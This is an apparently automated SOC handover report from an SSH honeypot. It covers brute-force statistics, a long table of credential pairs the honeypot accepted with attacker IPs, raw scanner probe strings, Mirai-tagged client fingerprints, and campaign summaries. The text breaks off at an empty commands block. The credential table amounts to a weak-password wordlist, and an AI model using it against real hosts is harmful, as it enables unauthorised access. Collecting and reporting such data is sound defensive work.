# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-01 |
| **Generated At** | 2026-08-01T10:04:09Z |
| **Shift Time** | 10:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **556** |
| Confirmed Threats | **511** |
| False Positives Filtered | **45** (8.1%) |
| Unique Attacker IPs | **280** |
| Countries of Origin | **46** |
| High Severity Cases | **260** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **296** |
| Malware Samples Analyzed | **3** HIGH · **26** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **422** |
| Unique Credential Pairs | **124** |
| Unique Usernames | **41** |
| Unique Passwords | **100** |
| Successful Auth Pairs | **299** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 115 |
| `admin` | 45 |
| `unknown` | 27 |
| `support` | 25 |
| `user` | 20 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 20 |
| `qwerty1234` | 16 |
| `123456` | 14 |
| `Pa$$w0rd` | 12 |
| `P@ssword` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `` | 16 |
| `root` | `Pa$$w0rd` | 12 |
| `blank` | `P@ssword` | 12 |
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `001` | 10 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `supervisor` | `qwer1234` | `220.246.43.109` | 2026-08-01T04:57:09 |
| `supervisor` | `qwer1234` | `60.223.245.120` | 2026-08-01T04:57:18 |
| `support` | `support` | `10.0.0.73` | 2026-08-01T04:58:27 |
| `root` | `PA$$WORD2025` | `123.1.147.204` | 2026-08-01T05:02:31 |
| `345gs5662d34` | `345gs5662d34` | `123.1.147.204` | 2026-08-01T05:02:35 |
| `root` | `3245gs5662d34` | `123.1.147.204` | 2026-08-01T05:02:36 |
| `supervisor` | `supervisor3` | `196.216.81.126` | 2026-08-01T05:04:24 |
| `supervisor` | `supervisor3` | `65.20.233.110` | 2026-08-01T05:04:31 |
| `supervisor` | `supervisor3` | `211.223.41.90` | 2026-08-01T05:04:38 |
| `operator` | `1q2w3e4r` | `10.0.0.73` | 2026-08-01T05:04:38 |
| `supervisor` | `supervisor3` | `117.252.93.114` | 2026-08-01T05:04:40 |
| `root` | `` | `190.188.60.235` | 2026-08-01T05:07:27 |
| `support` | `support` | `176.53.159.196` | 2026-08-01T05:08:24 |
| `operator` | `1q2w3e4r` | `120.234.232.184` | 2026-08-01T05:10:02 |
| `default` | `1q2w3e` | `182.60.128.241` | 2026-08-01T05:13:06 |
| `ubnt` | `4321` | `203.193.147.75` | 2026-08-01T05:13:30 |
| `root` | `Pa$$w0rd` | `10.0.0.73` | 2026-08-01T05:13:35 |
| `ftp` | `123` | `10.0.0.73` | 2026-08-01T05:13:53 |
| `user` | `qwerty1234` | `10.0.0.73` | 2026-08-01T05:13:58 |
| `adm` | `123456` | `113.219.177.95` | 2026-08-01T05:14:09 |
| `user` | `qwerty1234` | `218.200.9.182` | 2026-08-01T05:14:20 |
| `support` | `qwerty1234` | `10.0.0.73` | 2026-08-01T05:14:31 |
| `admin` | `654321` | `10.0.0.73` | 2026-08-01T05:14:40 |
| `user1` | `1234` | `62.201.212.54` | 2026-08-01T05:14:42 |
| `user1` | `1234` | `125.35.109.214` | 2026-08-01T05:14:55 |
| `ftpuser` | `123456` | `182.60.128.241` | 2026-08-01T05:15:00 |
| `root` | `qwerty123456` | `10.0.0.73` | 2026-08-01T05:15:07 |
| `root` | `Root123#` | `150.5.169.176` | 2026-08-01T05:15:41 |
| `345gs5662d34` | `345gs5662d34` | `150.5.169.176` | 2026-08-01T05:15:45 |
| `root` | `3245gs5662d34` | `150.5.169.176` | 2026-08-01T05:15:46 |
| `ftpuser` | `123456` | `10.0.0.73` | 2026-08-01T05:15:48 |
| `root` | `001` | `220.179.87.204` | 2026-08-01T05:15:57 |
| `root` | `Pa$$w0rd` | `68.7.114.69` | 2026-08-01T05:16:01 |
| `admin` | `admin123!@#` | `95.87.248.223` | 2026-08-01T05:16:08 |
| `root` | `Pa$$w0rd` | `58.245.210.70` | 2026-08-01T05:16:10 |
| `root` | `001` | `122.160.15.31` | 2026-08-01T05:16:10 |
| `admin` | `admin123!@#` | `112.120.115.152` | 2026-08-01T05:16:21 |
| `nobody` | `nobody2020` | `115.46.88.68` | 2026-08-01T05:16:29 |
| `test` | `test8` | `63.135.169.175` | 2026-08-01T05:16:38 |
| `nobody` | `nobody2020` | `111.42.175.101` | 2026-08-01T05:16:38 |
| `test` | `test8` | `171.217.70.151` | 2026-08-01T05:16:49 |
| `test` | `654321` | `178.178.222.59` | 2026-08-01T05:16:57 |
| `test` | `654321` | `70.91.135.181` | 2026-08-01T05:17:10 |
| `test` | `654321` | `178.178.222.53` | 2026-08-01T05:17:17 |
| `user` | `123456789` | `10.0.0.73` | 2026-08-01T05:17:39 |
| `guest` | `12345` | `10.0.0.73` | 2026-08-01T05:17:58 |
| `admin` | `qwerty1` | `36.137.38.119` | 2026-08-01T05:18:09 |
| `admin` | `qwerty1` | `117.211.15.106` | 2026-08-01T05:18:20 |
| `root` | `qwerty123456` | `14.99.61.248` | 2026-08-01T05:18:37 |
| `root` | `qwerty123456` | `83.166.50.15` | 2026-08-01T05:18:43 |
| `root` | `public` | `10.0.0.73` | 2026-08-01T05:18:49 |
| `default` | `webmaster` | `218.25.233.22` | 2026-08-01T05:19:37 |
| `default` | `webmaster` | `121.128.84.224` | 2026-08-01T05:19:45 |
| `user` | `0000` | `10.0.0.73` | 2026-08-01T05:19:54 |
| `root` | `Aa123456` | `10.0.0.73` | 2026-08-01T05:20:07 |
| `000000` | `000000` | `89.253.90.113` | 2026-08-01T05:20:12 |
| `admin` | `alpine` | `200.37.179.83` | 2026-08-01T05:21:03 |
| `admin` | `alpine` | `85.192.184.145` | 2026-08-01T05:21:10 |
| `hunter` | `hunter` | `112.194.142.167` | 2026-08-01T05:21:44 |
| `marcel` | `marcel` | `10.0.0.73` | 2026-08-01T05:21:54 |
| `support` | `admin1` | `111.70.32.49` | 2026-08-01T05:21:57 |
| `support` | `admin1` | `122.170.100.253` | 2026-08-01T05:22:05 |
| `Guest` | `Guest` | `10.0.0.73` | 2026-08-01T05:22:23 |
| `default` | `12345` | `182.139.39.150` | 2026-08-01T05:22:25 |
| `admin` | `password@123` | `10.0.0.73` | 2026-08-01T05:22:27 |
| `default` | `12345` | `70.91.135.181` | 2026-08-01T05:22:36 |
| `default` | `12345` | `10.0.0.73` | 2026-08-01T05:23:46 |
| `debian` | `abcd1234` | `65.20.138.46` | 2026-08-01T05:23:49 |
| `debian` | `abcd1234` | `136.56.34.147` | 2026-08-01T05:23:55 |
| `unknown` | `unknown1234567` | `10.0.0.73` | 2026-08-01T05:24:10 |
| `centos` | `7` | `10.0.0.73` | 2026-08-01T05:25:01 |
| `root` | `admin01` | `10.0.0.73` | 2026-08-01T05:25:33 |
| `root` | `public` | `183.247.171.186` | 2026-08-01T05:25:47 |
| `debian` | `22222222` | `101.13.9.48` | 2026-08-01T05:25:56 |
| `ubnt` | `letmein` | `64.72.74.162` | 2026-08-01T05:26:03 |
| `admin` | `qwerty1234` | `10.0.0.73` | 2026-08-01T05:26:16 |
| `test` | `Passw0rd` | `218.25.233.22` | 2026-08-01T05:26:53 |
| `ubuntu` | `test` | `116.48.138.69` | 2026-08-01T05:27:01 |
| `test` | `Passw0rd` | `223.25.108.2` | 2026-08-01T05:27:02 |
| `admin` | `qwerty1` | `10.0.0.73` | 2026-08-01T05:27:09 |
| `blank` | `P@ssword` | `112.161.26.125` | 2026-08-01T05:27:11 |
| `blank` | `P@ssword` | `65.20.237.191` | 2026-08-01T05:27:19 |
| `root` | `1qazxsw2` | `119.152.102.54` | 2026-08-01T05:27:24 |
| `blank` | `P@ssword` | `65.20.251.41` | 2026-08-01T05:27:26 |
| `admin` | `password@123` | `46.101.9.55` | 2026-08-01T05:28:03 |
| `default` | `alpine` | `10.0.0.73` | 2026-08-01T05:28:08 |
| `admin` | `password@123` | `202.72.196.75` | 2026-08-01T05:28:11 |
| `root` | `001` | `10.0.0.73` | 2026-08-01T05:29:09 |
| `hunter` | `hunter` | `109.206.102.75` | 2026-08-01T05:29:15 |
| `hunter` | `hunter` | `103.251.143.14` | 2026-08-01T05:29:27 |
| `default` | `1q2w3e` | `122.160.142.194` | 2026-08-01T05:29:38 |
| `default` | `1q2w3e` | `65.20.204.41` | 2026-08-01T05:29:48 |
| `admin` | `administrator` | `10.0.0.73` | 2026-08-01T05:29:57 |
| `adm` | `123456` | `183.89.248.224` | 2026-08-01T05:30:09 |
| `guest` | `qwerty12` | `10.0.0.73` | 2026-08-01T05:30:25 |
| `user1` | `1234` | `117.39.63.46` | 2026-08-01T05:30:52 |
| `ftpuser` | `123456` | `164.164.117.23` | 2026-08-01T05:31:07 |
| `unknown` | `unknown6` | `181.212.174.164` | 2026-08-01T05:31:52 |
| `root` | `001` | `101.13.1.58` | 2026-08-01T05:31:56 |
| `unknown` | `unknown6` | `49.206.201.253` | 2026-08-01T05:32:00 |
| `root` | `001` | `178.178.222.56` | 2026-08-01T05:32:08 |
| `support` | `qwerty1234` | `191.210.73.33` | 2026-08-01T05:32:12 |
| `admin` | `admin123!@#` | `182.53.52.68` | 2026-08-01T05:32:16 |
| `support` | `qwerty1234` | `65.20.153.146` | 2026-08-01T05:32:19 |
| `blank` | `P@ssword` | `10.0.0.73` | 2026-08-01T05:32:20 |
| `supervisor` | `supervisor444` | `10.0.0.73` | 2026-08-01T05:32:36 |
| `test` | `654321` | `124.239.129.2` | 2026-08-01T05:33:05 |
| `hunter` | `hunter` | `10.0.0.73` | 2026-08-01T05:33:28 |
| `root` | `Abc123456` | `10.0.0.73` | 2026-08-01T05:33:35 |
| `support` | `147258369` | `46.201.247.21` | 2026-08-01T05:34:21 |
| `support` | `147258369` | `146.158.118.252` | 2026-08-01T05:34:28 |
| `root` | `qwerty123456` | `51.52.210.77` | 2026-08-01T05:34:31 |
| `config` | `config11` | `92.84.21.186` | 2026-08-01T05:34:40 |
| `root` | `qwerty123456` | `138.219.13.21` | 2026-08-01T05:34:43 |
| `default` | `webmaster` | `122.176.21.104` | 2026-08-01T05:35:34 |
| `ubnt` | `letmein` | `10.0.0.73` | 2026-08-01T05:35:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.195.51.126` | 2026-08-01T05:35:56 |
| `*1` | `$4` | `35.195.51.126` | 2026-08-01T05:36:05 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1561` | `35.195.51.126` | 2026-08-01T05:36:07 |
| `test` | `abc123` | `10.0.0.73` | 2026-08-01T05:37:14 |
| `hunter` | `hunter` | `177.174.89.99` | 2026-08-01T05:37:33 |
| `hunter` | `hunter` | `213.32.20.78` | 2026-08-01T05:37:39 |
| `support` | `admin1` | `208.96.233.67` | 2026-08-01T05:37:52 |
| `default` | `12345` | `90.228.229.182` | 2026-08-01T05:38:10 |
| `default` | `12345` | `207.219.221.101` | 2026-08-01T05:38:16 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-01T05:38:55 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-01T05:38:55 |
| `config` | `config0` | `103.120.116.162` | 2026-08-01T05:39:30 |
| `config` | `config0` | `62.201.228.210` | 2026-08-01T05:39:52 |
| `root` | `public` | `42.248.129.234` | 2026-08-01T05:41:52 |
| `user` | `123456654321` | `10.0.0.73` | 2026-08-01T05:41:54 |
| `root` | `Pa$$w0rd` | `83.166.50.15` | 2026-08-01T05:41:58 |
| `debian` | `22222222` | `210.177.143.61` | 2026-08-01T05:41:59 |
| `root` | `Pa$$w0rd` | `121.179.93.147` | 2026-08-01T05:42:06 |
| `ubnt` | `letmein` | `112.31.93.229` | 2026-08-01T05:42:12 |
| `ubnt` | `letmein` | `58.34.174.90` | 2026-08-01T05:42:26 |
| `test` | `Passw0rd` | `196.190.180.18` | 2026-08-01T05:42:52 |
| `ubuntu` | `test` | `220.134.25.203` | 2026-08-01T05:43:02 |
| `blank` | `P@ssword` | `208.109.38.143` | 2026-08-01T05:43:05 |
| `root` | `1qazxsw2` | `196.191.142.67` | 2026-08-01T05:43:11 |
| `admin` | `Admin1234` | `10.0.0.73` | 2026-08-01T05:43:48 |
| `admin` | `password@123` | `113.11.34.221` | 2026-08-01T05:43:48 |
| `guest` | `P@ssw0rd` | `10.0.0.73` | 2026-08-01T05:43:57 |
| `admin` | `password@123` | `60.166.8.174` | 2026-08-01T05:43:57 |
| `adm` | `123456` | `10.0.0.73` | 2026-08-01T05:44:08 |
| `admin` | `admin` | `41.63.63.211` | 2026-08-01T05:45:00 |
| `ubuntu` | `test` | `10.0.0.73` | 2026-08-01T05:45:05 |
| `ubnt` | `4321` | `186.215.107.189` | 2026-08-01T05:45:36 |
| `user` | `qwerty1234` | `200.105.141.172` | 2026-08-01T05:46:10 |
| `user1` | `1234` | `65.20.168.147` | 2026-08-01T05:46:34 |
| `root` | `123qwe123qwe` | `10.0.0.73` | 2026-08-01T05:46:36 |
| `user1` | `1234` | `58.226.255.240` | 2026-08-01T05:46:46 |
| `root` | `001` | `24.142.170.231` | 2026-08-01T05:47:40 |
| `unknown` | `unknown6` | `31.173.66.222` | 2026-08-01T05:47:47 |
| `root` | `Pa$$w0rd` | `157.20.228.20` | 2026-08-01T05:47:54 |
| `test` | `654321` | `95.79.57.221` | 2026-08-01T05:48:48 |
| `test` | `654321` | `203.192.247.84` | 2026-08-01T05:48:59 |
| `admin` | `qwerty1` | `213.32.20.78` | 2026-08-01T05:49:58 |
| `admin` | `qwerty1` | `190.57.233.133` | 2026-08-01T05:50:06 |
| `support` | `147258369` | `107.135.117.245` | 2026-08-01T05:50:18 |
| `support` | `147258369` | `187.115.144.103` | 2026-08-01T05:50:27 |
| `config` | `config11` | `185.255.212.178` | 2026-08-01T05:50:37 |
| `config` | `config11` | `196.203.231.220` | 2026-08-01T05:50:42 |
| `000000` | `000000` | `36.137.38.119` | 2026-08-01T05:52:05 |
| `000000` | `000000` | `208.109.38.143` | 2026-08-01T05:52:14 |
| `nobody` | `password321` | `177.135.206.10` | 2026-08-01T05:52:48 |
| `default` | `12345` | `111.39.167.59` | 2026-08-01T05:53:59 |
| `default` | `12345` | `120.194.50.39` | 2026-08-01T05:54:08 |
| `supervisor` | `000` | `10.0.0.73` | 2026-08-01T05:55:38 |
| `debian` | `abcd1234` | `117.254.104.107` | 2026-08-01T05:55:42 |
| `support` | `147258369` | `10.0.0.73` | 2026-08-01T05:55:42 |
| `debian` | `abcd1234` | `187.8.120.90` | 2026-08-01T05:55:56 |
| `root` | `Pa$$w0rd` | `197.242.170.10` | 2026-08-01T05:57:45 |
| `debian` | `22222222` | `153.37.177.219` | 2026-08-01T05:57:47 |
| `ubnt` | `letmein` | `92.84.21.186` | 2026-08-01T05:57:52 |
| `debian` | `22222222` | `92.126.223.175` | 2026-08-01T05:57:55 |
| `ubnt` | `letmein` | `187.8.120.90` | 2026-08-01T05:58:03 |
| `blank` | `P@ssword` | `210.245.95.11` | 2026-08-01T05:58:55 |
| `blank` | `P@ssword` | `103.31.38.92` | 2026-08-01T05:59:03 |
| `blank` | `P@ssword` | `111.70.32.9` | 2026-08-01T05:59:05 |
| `blank` | `P@ssword` | `65.20.168.147` | 2026-08-01T05:59:12 |
| `root` | `1qazxsw2` | `220.124.233.214` | 2026-08-01T05:59:14 |
| `admin` | `password@123` | `78.186.54.65` | 2026-08-01T05:59:48 |
| `admin` | `admin123!@#` | `10.0.0.73` | 2026-08-01T06:00:04 |
| `admin` | `alpine` | `187.8.120.90` | 2026-08-01T06:00:56 |
| `root` | `123qwe123qwe` | `49.124.152.219` | 2026-08-01T06:04:58 |
| `root` | `123qwe123qwe` | `125.72.150.250` | 2026-08-01T06:05:09 |
| `root` | `admin` | `204.76.203.81` | 2026-08-01T06:05:49 |
| `user` | `1974` | `65.20.198.159` | 2026-08-01T06:07:07 |
| `user` | `1974` | `220.179.87.204` | 2026-08-01T06:07:22 |
| `sales` | `1234` | `144.225.187.161` | 2026-08-01T06:09:55 |
| `345gs5662d34` | `345gs5662d34` | `144.225.187.161` | 2026-08-01T06:09:57 |
| `sales` | `3245gs5662d34` | `144.225.187.161` | 2026-08-01T06:09:57 |
| `root` | `asdfghjkl` | `83.166.50.15` | 2026-08-01T06:12:33 |
| `GET / HTTP/1.0` | `` | `143.110.200.219` | 2026-08-01T06:13:46 |
| `OPTIONS / HTTP/1.0` | `` | `143.110.200.219` | 2026-08-01T06:13:48 |
| `OPTIONS / RTSP/1.0` | `` | `143.110.200.219` | 2026-08-01T06:13:51 |
| `GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0` | `` | `143.110.200.219` | 2026-08-01T06:14:06 |
| `b'0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00'` | ` ` | `143.110.200.219` | 2026-08-01T06:14:10 |
| `OPTIONS sip:nm SIP/2.0` | `Via: SIP/2.0/TCP nm;branch=foo` | `143.110.200.219` | 2026-08-01T06:14:14 |
| `b'\x10\x00\x03\x00LIORL\t\x00\x00\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00c\xaa\xbed\x01\x00\x00\x00\x01\x1c \x02`\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x000\x00.\x001\x000\x000\x00/\x00m\x00s\x00m\x00q\x00/\x00p\x00r\x00i\x00v\x00a\x00t\x00e\x00$\x00/\x00q\x00u\x00e\x00u\x00e\x00j\x00u\x00m\x00p\x00e\x00r\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\x00o\x00c\x00\x00\x00\x00\x00\x00\x00\x1b\x02\x00\x00<\x00s\x00e\x00:\x00E\x00n\x00v\x00e\x00l\x00o\x00p\x00e\x00 \x00x\x00m\x00l\x00n\x00s\x00:\x00s\x00e\x00=\x00"\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00s\x00c\x00h\x00e\x00m\x00a\x00s\x00.\x00x\x00m\x00l\x00s\x00o\x00a\x00p\x00.\x00o\x00r\x00g\x00/\x00s\x00o\x00a\x00p\x00/\x00e\x00n\x00v\x00e\x00l\x00o\x00p\x00e\x00/\x00"\x00 \x00\r'` | ` x m l n s = " h t t p : / / s c h e m a s . x m l s o a p . o r g / s r m p / " > ` | `143.110.200.219` | 2026-08-01T06:14:29 |
| ` < s e : H e a d e r > ` | `   < p a t h   x m l n s = " h t t p : / / s c h e m a s . x m l s o a p . o r g / r p / "   s e : m u s t U n d e r s t a n d = " 1 " > ` | `143.110.200.219` | 2026-08-01T06:14:29 |
| `supervisor` | `000` | `219.129.96.2` | 2026-08-01T06:14:33 |
| `supervisor` | `000` | `49.124.152.34` | 2026-08-01T06:14:43 |
| `supervisor` | `000` | `137.27.32.70` | 2026-08-01T06:14:43 |
| `supervisor` | `000` | `96.1.40.151` | 2026-08-01T06:14:54 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.140.142.223` | 2026-08-01T06:19:54 |
| `*1` | `$4` | `34.140.142.223` | 2026-08-01T06:20:07 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7056` | `34.140.142.223` | 2026-08-01T06:20:09 |
| `unknown` | `unknown55` | `10.0.0.73` | 2026-08-01T06:21:31 |
| `unknown` | `unknown55` | `59.46.182.10` | 2026-08-01T06:23:12 |
| `unknown` | `unknown55` | `90.228.229.182` | 2026-08-01T06:23:19 |
| `root` | `asdfghjkl` | `10.0.0.73` | 2026-08-01T06:24:42 |
| `root` | `1992` | `10.0.0.73` | 2026-08-01T06:30:39 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `66.228.40.100` | 2026-08-01T06:37:00 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-01T06:38:40 |
| `unknown` | `unknown55` | `36.137.38.119` | 2026-08-01T06:39:57 |
| `unknown` | `unknown55` | `188.168.86.6` | 2026-08-01T06:40:05 |
| `root` | `asdfghjkl` | `186.235.193.170` | 2026-08-01T06:42:39 |
| `root` | `asdfghjkl` | `121.202.206.119` | 2026-08-01T06:42:51 |
| `admin` | `admin` | `34.77.36.89` | 2026-08-01T06:45:17 |
| `root` | `vision123` | `69.49.246.176` | 2026-08-01T06:46:26 |
| `345gs5662d34` | `345gs5662d34` | `69.49.246.176` | 2026-08-01T06:46:27 |
| `root` | `3245gs5662d34` | `69.49.246.176` | 2026-08-01T06:46:28 |
| `unknown` | `12345678` | `103.174.145.35` | 2026-08-01T06:48:06 |
| `unknown` | `12345678` | `101.13.5.26` | 2026-08-01T06:48:14 |
| `ab` | `123456` | `5.175.136.100` | 2026-08-01T06:49:50 |
| `root` | `1992` | `78.187.9.111` | 2026-08-01T06:49:53 |
| `345gs5662d34` | `345gs5662d34` | `5.175.136.100` | 2026-08-01T06:49:54 |
| `ab` | `3245gs5662d34` | `5.175.136.100` | 2026-08-01T06:49:56 |
| `admin` | `admin` | `192.34.62.126` | 2026-08-01T06:53:42 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-01T06:53:43 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `203.55.131.3` | 2026-08-01T06:54:45 |
| `root` | `123` | `2.57.122.168` | 2026-08-01T06:58:09 |
| `root` | `qwertyuiop` | `124.239.169.52` | 2026-08-01T06:59:03 |
| `root` | `qwertyuiop` | `178.178.194.134` | 2026-08-01T06:59:15 |
| `unknown` | `12345678` | `10.0.0.73` | 2026-08-01T07:00:13 |
| `root` | `1234` | `2.57.122.168` | 2026-08-01T07:00:38 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-01T07:00:50 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-01T07:00:50 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-01T07:00:53 |
| `root` | `12345` | `2.57.122.168` | 2026-08-01T07:03:04 |
| `root` | `Smart@2025` | `107.180.88.176` | 2026-08-01T07:07:50 |
| `345gs5662d34` | `345gs5662d34` | `107.180.88.176` | 2026-08-01T07:07:52 |
| `root` | `3245gs5662d34` | `107.180.88.176` | 2026-08-01T07:07:52 |
| `root` | `1234567` | `2.57.122.168` | 2026-08-01T07:07:53 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `35.240.24.252` | 2026-08-01T07:09:13 |
| `root` | `` | `45.74.3.137` | 2026-08-01T07:09:17 |
| `*1` | `$4` | `35.240.24.252` | 2026-08-01T07:09:26 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4837` | `35.240.24.252` | 2026-08-01T07:09:28 |
| `hive` | `hive` | `103.200.22.154` | 2026-08-01T07:09:34 |
| `345gs5662d34` | `345gs5662d34` | `103.200.22.154` | 2026-08-01T07:09:38 |
| `hive` | `3245gs5662d34` | `103.200.22.154` | 2026-08-01T07:09:40 |
| `root` | `12345678` | `2.57.122.168` | 2026-08-01T07:10:19 |
| `root` | `ubuntu` | `101.36.228.201` | 2026-08-01T07:10:35 |
| `root` | `123456789` | `2.57.122.168` | 2026-08-01T07:13:21 |
| `root` | `1234567890` | `2.57.122.168` | 2026-08-01T07:16:13 |
| `unknown` | `12345678` | `218.200.9.182` | 2026-08-01T07:17:57 |
| `root` | `123abc` | `2.57.122.168` | 2026-08-01T07:19:10 |
| `blank` | `blank22` | `93.177.157.179` | 2026-08-01T07:23:27 |
| `blank` | `blank22` | `49.124.153.61` | 2026-08-01T07:23:36 |
| `admin` | `admin666` | `220.246.41.171` | 2026-08-01T07:25:45 |
| `admin` | `admin666` | `115.241.228.34` | 2026-08-01T07:25:55 |
| `root` | `admin` | `191.180.161.164` | 2026-08-01T07:28:47 |
| `root` | `!QAZxsw23edc` | `211.38.183.218` | 2026-08-01T07:31:12 |
| `345gs5662d34` | `345gs5662d34` | `211.38.183.218` | 2026-08-01T07:31:16 |
| `root` | `3245gs5662d34` | `211.38.183.218` | 2026-08-01T07:31:17 |
| `supervisor` | `password321` | `10.0.0.73` | 2026-08-01T07:32:39 |
| `blank` | `blank22` | `10.0.0.73` | 2026-08-01T07:35:32 |
| `support` | `fuckyou` | `10.0.0.73` | 2026-08-01T07:41:28 |
| `root` | `abc@@123` | `115.190.64.245` | 2026-08-01T07:42:31 |
| `345gs5662d34` | `345gs5662d34` | `115.190.64.245` | 2026-08-01T07:42:37 |
| `root` | `3245gs5662d34` | `115.190.64.245` | 2026-08-01T07:42:41 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-01T07:50:22 |
| `supervisor` | `password321` | `81.214.75.248` | 2026-08-01T07:51:02 |
| `supervisor` | `password321` | `223.25.108.2` | 2026-08-01T07:51:11 |
| `samurai` | `samurai` | `85.152.57.60` | 2026-08-01T07:58:48 |
| `samurai` | `samurai` | `121.189.198.60` | 2026-08-01T07:59:00 |
| `support` | `fuckyou` | `222.120.176.6` | 2026-08-01T08:00:37 |
| `support` | `fuckyou` | `136.56.34.147` | 2026-08-01T08:00:50 |
| `support` | `fuckyou` | `196.189.126.185` | 2026-08-01T08:00:55 |
| `unknown` | `5555` | `10.0.0.73` | 2026-08-01T08:07:50 |
| `unknown` | `5555` | `103.93.37.178` | 2026-08-01T08:09:38 |
| `admin` | `admin` | `114.55.149.142` | 2026-08-01T08:19:00 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-01T08:22:17 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-01T08:22:17 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `172.105.128.12` | 2026-08-01T08:25:12 |
| `unknown` | `5555` | `111.70.22.154` | 2026-08-01T08:26:16 |
| `unknown` | `5555` | `35.130.111.146` | 2026-08-01T08:26:25 |
| `samurai` | `samurai` | `123.212.9.122` | 2026-08-01T08:28:36 |
| `samurai` | `samurai` | `109.233.21.109` | 2026-08-01T08:28:44 |
| `unknown` | `unknown13` | `10.0.0.73` | 2026-08-01T08:42:53 |
| `ubuntu` | `qwer` | `134.209.116.251` | 2026-08-01T08:43:10 |
| `345gs5662d34` | `345gs5662d34` | `134.209.116.251` | 2026-08-01T08:43:11 |
| `ubuntu` | `3245gs5662d34` | `134.209.116.251` | 2026-08-01T08:43:11 |
| `unknown` | `unknown13` | `65.20.204.41` | 2026-08-01T08:44:33 |
| `unknown` | `unknown13` | `117.204.1.45` | 2026-08-01T08:44:41 |
| `test` | `test222` | `10.0.0.73` | 2026-08-01T08:46:13 |
| `root` | `﻿------fuck------` | `101.126.146.145` | 2026-08-01T08:50:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **556** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 175 |
| libssh | 49 |
| Go SSH scanner | 28 |
| Paramiko (Python) | 18 |
| Nmap scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 174 | 153 |
| `f555226df196...` | Mirai/variant | 30 | 10 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 9 | 1 |
| `87e3d9ffee05...` | Mirai/variant | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 174 | 153 | Mirai/variant |
| `f555226df196...` | libssh | 30 | 10 | Mirai/variant |
| `95420f9d932d...` | libssh | 15 | 7 | — |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 9 | 1 | Mirai/variant |
| `87e3d9ffee05...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **14** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 8 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
